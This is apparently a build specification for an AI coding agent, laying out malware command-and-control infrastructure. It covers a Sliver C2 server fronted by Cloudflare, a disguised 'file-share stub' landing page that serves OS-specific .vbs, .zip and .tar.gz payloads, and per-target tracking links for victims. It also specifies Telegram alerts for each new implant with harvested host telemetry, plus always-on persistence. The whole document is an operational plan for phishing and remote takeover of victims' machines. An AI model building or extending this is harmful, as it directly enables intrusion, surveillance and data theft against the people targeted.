# EXTRA: edge, delivery surface, alerting, 24/7

Extends SPEC.md. Same rules, same gates. Build after M5. Do not start before
the M5 gate passes.

## A. Cloudflare edge (credentials already in env)

`CF_API_TOKEN`, `CF_ZONE_NAME`, `TG_BOT_TOKEN`, `TG_CHAT_ID` are present.
Never print them, never commit them.

A1. Resolve account and zone, assert the token works, write both IDs to
`deploy/.cf-ids` (chmod 600). Fail loudly with the API error body if either
is missing — do not guess a zone.

A2. Create four records, idempotent (list first, create only if absent):

| name | type | proxied | purpose |
|---|---|---|---|
| `panel.<zone>` | CNAME → `<tunnel>.cfargotunnel.com` | yes | operator UI |
| `get.<zone>` | CNAME → `<tunnel>` | yes | landing page + payload delivery |
| `dl.<zone>` | CNAME → `<tunnel>` | yes | artifact download only |
| `c2.<zone>` | A → origin IPv4 | **no** | Sliver mTLS :8888 |

`c2` must be grey-cloud. Cloudflare does not proxy raw mTLS. Set TTL 120 for
the grey record so you can rotate origin without a wait.

A3. Cloudflare Tunnel: create `fleet-edge`, attach config routing `panel`, `get`,
`dl` to the right local ports, install `cloudflared` as a systemd service via
its token. No inbound 80/443 needed on the origin afterwards — close them in
firewalld and in the OCI Security List and note it in `oracle-notes.md`.

A4. Cloudflare Access policy on `panel.<zone>`: allow only the operator email
from `OPERATOR_EMAIL`, one-time PIN, 24h session. `get` and `dl` stay public.
Document how to disable Access if it fights WebSocket upgrades.

## B. Credentials and login

B1. Generate a 24-char password from `/dev/urandom` (base64url, no shell
metacharacters). bcrypt it, write `PANEL_USER` / `PANEL_PASS_HASH` to
`/etc/panel/env`, mode 600.

B2. Print the plaintext password exactly once to stdout in a bordered block,
then POST it to Telegram with `parse_mode=HTML` and a "save this" header. Never
write plaintext to disk.

B3. Enforce: 20-char minimum, lockout after 5 failures for 15 minutes, cookie
`Secure; HttpOnly; SameSite=Strict`, rotate session ID on login.

## C. Telegram

C1. `tg.py`: `send(html)`, `send_document(path, caption)`, with 1.5s spacing,
exponential backoff on 429, and a bounded queue so a dead Telegram never blocks
the panel.

C2. Subscribe to Sliver's client event stream (find the real RPC by grepping
`clientpb` — likely `Register` returning `clientpb.Event`, filtered on
`sessionevent` / `beaconevent`). On a new session fire exactly one alert:

```
🟢 NEW IMPLANT
host / user / OS / arch / integrity
public IP / local IPs
AV products / uptime
session id
```

C3. Then, on a 10s delay, collect telemetry: `info`, `whoami` (Windows: `whoami /all`),
`ps` top 15, `ifconfig`/`ipconfig`, `netstat -an` top 20, disk usage, installed
AV. Post as HTML, truncate each block to 3500 chars, split across messages.
Never block the session list on this.

C4. Alert on: panel start, panel crash, TLS/tunnel down, session death, failed
login burst (3+ in 5 min). Severity prefix in the first line.

C5. Telegram failures are logged and retried 3×, then dropped. Never raise into
the request path.

## D. Landing page

D1. `get.<zone>/` serves a plain static page titled with the document name.
User-agent sniff → Windows offers the `.vbs`, macOS the `.zip`, Linux the
`.tar.gz`. Unknown UA shows all three.

D2. Per-target links `get.<zone>/e/<slug>` record slug → build → first-hit
timestamp in SQLite, so an install can be attributed to the link that produced
it. Slug is 8 chars.

D3. Page must look like a file-share stub: one line of body text, one big
button, no branding, no JS beyond the sniff. Load in under 400ms.

D4. `dl.<zone>/<artifact>` streams from disk with `Content-Disposition:
attachment`, `Cache-Control: no-store`, and correct MIME per extension.

## E. 24/7

E1. systemd units for `panel`, `cloudflared`, `sliver`:
`Restart=always`, `RestartSec=5`, `WatchdogSec=60`, `MemoryMax=1G`,
`NoNewPrivileges=yes`, `PrivateTmp=yes`, `ProtectSystem=strict` with explicit
`ReadWritePaths`. Sliver unit gets `After=network-online.target`.

E2. `healthcheck.sh` every 60s via timer: assert panel `/healthz`, tunnel
process alive, gRPC reachable. Three consecutive failures → Telegram, then
`systemctl restart`. Reset counter on success.

E3. Oracle reclaims idle Always Free instances. Add a cron burning ~10% of one
core for 30s every 5 minutes, and a second cron re-posting a heartbeat to
Telegram every 6h so a silent death is visible.

E4. `logrotate` for panel and sliver logs, daily, 7 days, `compress`,
`copytruncate`. Journald capped at 200M via `/etc/systemd/journald.conf`.

E5. `deploy.sh --check` gains: token validity, zone presence, record state,
tunnel running, unit enabled, Access policy present, disk > 2G free.

## F. Acceptance

1. `curl -sI https://get.<zone>/` returns 200 and the page sniffs correctly for
   three UAs.
2. Fresh implant on each OS produces exactly one Telegram alert with full
   telemetry within 90s.
3. `systemctl stop panel` → healthcheck Telegrams within 3 minutes and the unit
   is back up within 5.
4. `c2.<zone>` resolves to the origin, is grey-cloud, and an implant connects
   over it.
5. Killing cloudflared restores itself and `get.` serves again without manual
   action.
6. Password is 24 chars, bcrypt-stored, and a 6th bad login locks for 15 min.